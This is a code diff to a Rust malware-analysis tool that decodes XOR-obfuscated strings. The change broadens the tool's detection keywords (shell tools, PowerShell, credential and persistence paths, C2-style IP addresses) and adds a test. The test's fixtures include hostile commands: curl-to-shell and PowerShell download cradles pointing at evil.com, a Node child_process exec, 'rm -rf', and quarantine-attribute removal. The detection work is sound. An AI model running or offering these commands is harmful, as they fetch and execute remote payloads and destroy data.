@@ -2126,16 +2126,29 @@ fn is_printable_char(b: u8) -> bool {
 /// Check if a decoded XOR string is valid (not garbage with unusual punctuation).
 /// Returns true if the string passes basic sanity checks.
 fn is_valid_xor_string(s: &str) -> bool {
+    let lower = s.to_ascii_lowercase();
+
     // Check for specific malicious indicators (not just any system path)
     let has_shell_command = s.contains("osascript") || s.contains("screencapture") ||
         s.contains("bash ") || s.contains("sh -") || s.contains("curl ") ||
-        s.contains("wget ") || s.contains("chmod ");
+        s.contains("wget ") || s.contains("chmod ") || s.contains("python ") ||
+        s.contains("perl ") || s.contains("ruby ") || s.contains("/bin/") ||
+        s.contains("sleep ") || s.contains(" rm ") || s.contains("rm -") ||
+        s.contains("echo ") || s.contains("kill ") || s.contains("ps ") ||
+        lower.contains("powershell") || lower.contains("cmd.exe") || lower.contains("xattr");
 
     let has_suspicious_path = s.contains("Ethereum/keystore") ||
         s.contains("/tmp/") && (s.contains(".sh") || s.contains("payload")) ||
-        s.contains("/etc/passwd") || s.contains("/etc/shadow");
+        s.contains("/etc/passwd") || s.contains("/etc/shadow") ||
+        lower.contains("appdata") || lower.contains("programdata") ||
+        lower.contains("launchagents") || lower.contains("launchdaemons");
 
     let has_suspicious_url = s.contains("://") && !s.contains("apple.com");
+
+    // Check for IP addresses (likely C2 infrastructure) - pattern: N.N.N.N
+    let has_ip = s.chars().filter(|&c| c == '.').count() == 3 &&
+        s.split('.').filter(|seg| !seg.is_empty() &&
+            seg.chars().all(|c| c.is_ascii_digit()) && seg.len() <= 3).count() == 4;
 
     // Check for unicode escape sequences (legitimate obfuscation)
     let has_unicode_escapes = s.contains("\\x") || s.contains("\\u");
@@ -2153,7 +2166,8 @@ fn is_valid_xor_string(s: &str) -> bool {
     }).count();
 
     // If string has SPECIFIC malicious indicators OR encoding, allow them
-    if has_shell_command || has_suspicious_path || has_suspicious_url || has_unicode_escapes || has_heredoc {
+    // This bypass ensures high-value IOCs pass validation even with unusual chars
+    if has_shell_command || has_suspicious_path || has_suspicious_url || has_ip || has_unicode_escapes || has_heredoc {
         // Only reject if mostly control characters (> 30%)
         return control_chars * 3 < s.len();
     }
@@ -2187,6 +2201,11 @@ fn is_valid_xor_string(s: &str) -> bool {
         matches!(c, '$' | '#' | '@' | '!' | '"' | '\'' | '\\')
     }).count();
 
+    // Count additional special chars that often indicate garbage (but can be legitimate)
+    let additional_special = s.chars().filter(|&c| {
+        matches!(c, ':' | '+' | '=' | '*' | '&' | '%')
+    }).count();
+
     // Reject if we have ANY bad punctuation characters
     if bad_punct_count > 0 {
         return false;
@@ -2195,6 +2214,19 @@ fn is_valid_xor_string(s: &str) -> bool {
     // Also reject strings with excessive "questionable" punctuation
     // Allow max 2 questionable punctuation chars, or 20% of string length
     if questionable_punct > 2 && questionable_punct * 5 > s.len() {
+        return false;
+    }
+
+    // Reject if total special character density is too high (likely garbage)
+    let total_special = questionable_punct + additional_special;
+    if !s.is_empty() && total_special * 100 / s.len() > 40 {
+        return false;
+    }
+
+    // Always check meaningfulness for non-IOC strings
+    // This catches garbage fragments like " j3/ N1 9-P" that have few special chars
+    // but lack linguistic patterns (vowels, word structure, etc.)
+    if !is_meaningful_string(s) {
         return false;
     }
 
@@ -2640,12 +2672,10 @@ const KNOWN_PATH_PREFIXES: &[&str] = &[
 
 /// Classify an XOR-decoded string. Returns None if it doesn't look interesting.
 fn classify_xor_string(s: &str) -> Option<StringKind> {
-    // First check if string has invalid punctuation characters
-    if !is_valid_xor_string(s) {
-        return None;
-    }
-
     let lower = s.to_ascii_lowercase();
+
+    // FIRST: Check for high-value IOCs that should bypass strict filtering
+    // These are important enough that we want them even if they have unusual chars
 
     // Check for well-known suspicious paths (even with garbage around them)
     for sus_path in SUSPICIOUS_PATHS {
@@ -2675,6 +2705,35 @@ fn classify_xor_string(s: &str) -> Option<StringKind> {
         }
     }
 
+    // Quick check for URLs/IPs before strict filtering
+    if lower.contains("http://") || lower.contains("https://") || lower.contains("://") {
+        // Likely a URL, allow through
+        let kind = classify_string(s);
+        if matches!(kind, StringKind::Url) {
+            return Some(kind);
+        }
+    }
+
+    // Check for IP addresses (pattern: digits.digits.digits.digits)
+    if s.chars().filter(|&c| c == '.').count() == 3 {
+        let segments: Vec<&str> = s.split('.').collect();
+        if segments.len() == 4 && segments.iter().all(|seg| {
+            !seg.is_empty() && seg.chars().all(|c| c.is_ascii_digit()) && seg.len() <= 3
+        }) {
+            // Likely an IP address, allow through
+            let kind = classify_string(s);
+            if matches!(kind, StringKind::IP | StringKind::IPPort) {
+                return Some(kind);
+            }
+        }
+    }
+
+    // SECOND: Apply strict filtering for everything else
+    if !is_valid_xor_string(s) {
+        return None;
+    }
+
+    // THIRD: Classify remaining strings normally
     let kind = classify_string(s);
 
     match kind {
@@ -3543,6 +3602,8 @@ mod tests {
                     section_size: None,
                     section_executable: None,
                     section_writable: None,
+                    architecture: None,
+                    function_meta: None,
             },
             ExtractedString {
                 value: "cstr.SomeString".to_string(),
@@ -3555,6 +3616,8 @@ mod tests {
                     section_size: None,
                     section_executable: None,
                     section_writable: None,
+                    architecture: None,
+                    function_meta: None,
             },
             ExtractedString {
                 value: "ShortKey".to_string(),
@@ -3567,6 +3630,8 @@ mod tests {
                     section_size: None,
                     section_executable: None,
                     section_writable: None,
+                    architecture: None,
+                    function_meta: None,
             },
             ExtractedString {
                 value: key_string.to_string(), // The actual key
@@ -3579,6 +3644,8 @@ mod tests {
                     section_size: None,
                     section_executable: None,
                     section_writable: None,
+                    architecture: None,
+                    function_meta: None,
             },
         ];
 
@@ -3647,6 +3714,8 @@ mod tests {
                     section_size: None,
                     section_executable: None,
                     section_writable: None,
+                    architecture: None,
+                    function_meta: None,
             },
             ExtractedString {
                 value: key_string.to_string(),
@@ -3659,6 +3728,8 @@ mod tests {
                     section_size: None,
                     section_executable: None,
                     section_writable: None,
+                    architecture: None,
+                    function_meta: None,
             },
         ];
 
@@ -3988,5 +4059,71 @@ mod tests {
             results3.iter().any(|r| r.kind == StringKind::Path),
             "/dev/urandom should be detected as path"
         );
+    }
+
+    #[test]
+    fn test_bizarre_legitimate_iocs_pass() {
+        // Test that bizarre but legitimate IOCs pass through the filter
+        // This ensures high-value patterns bypass strict filtering
+        let key = b"TESTKEY";
+
+        let test_cases = vec![
+            // Shell redirections with special chars
+            ("osascript 2>&1 <<EOD", "heredoc with redirect"),
+            ("bash -c 'curl http://evil.com | sh'", "pipe in shell"),
+            ("python -c \"import os; os.system('ls')\"", "python one-liner"),
+            ("sleep 3; rm -rf /tmp/bad", "sleep and rm commands"),
+            ("open -a /bin/bash --args -c \"sleep 3; rm -rf '%s'\"", "macOS open with nested shell command"),
+
+            // Complex paths with special chars
+            ("/usr/bin/python -m http.server 8080", "python command with args"),
+
+            // URLs with ports and special chars
+            ("https://192.168.1.1:8080/api/v1", "URL with IP and port"),
+            ("http://evil.com:443/path", "URL with port"),
+
+            // IP addresses
+            ("192.168.1.100", "IP address"),
+            ("45.33.32.156", "IP address"),
+
+            // Unicode escapes (legitimate obfuscation)
+            ("decode\\x20this\\x20data", "hex escape sequences"),
+            ("string\\u0041test", "unicode escape"),
+
+            // Shell commands with special chars that are NOT garbage
+            ("xattr -d com.apple.quarantine", "xattr command"),
+            ("curl -X POST -H 'Content-Type: json'", "curl with headers"),
+            ("/bin/bash -c 'echo test'", "bash command"),
+            ("perl -e 'print \"test\"'", "perl one-liner"),
+
+            // PowerShell examples (Windows malware patterns)
+            ("powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com')\"", "powershell download cradle"),
+            ("powershell -ExecutionPolicy Bypass -File script.ps1", "powershell bypass execution policy"),
+            ("powershell -encodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=", "powershell encoded command"),
+            ("cmd.exe /c powershell -nop -w hidden -c IEX", "cmd.exe launching powershell"),
+
+            // JavaScript/Node.js examples (obfuscated malware patterns)
+            ("eval(atob('ZG9jdW1lbnQubG9jYXRpb24uaHJlZg=='))", "javascript eval with base64"),
+            ("require('child_process').exec('curl http://evil.com')", "nodejs child_process exec"),
+            ("Function('return this')().eval('malicious code')", "javascript obfuscated eval"),
+        ];
+
+        for (plaintext, description) in test_cases {
+            let xored: Vec<u8> = plaintext
+                .as_bytes()
+                .iter()
+                .enumerate()
+                .map(|(i, &b)| b ^ key[i % key.len()])
+                .collect();
+
+            let results = extract_custom_xor_strings(&xored, key, 10);
+            let found = !results.is_empty();
+
+            assert!(
+                found,
+                "Should PASS: '{}' - {} (got {} results)",
+                plaintext, description, results.len()
+            );
+        }
     }
 }
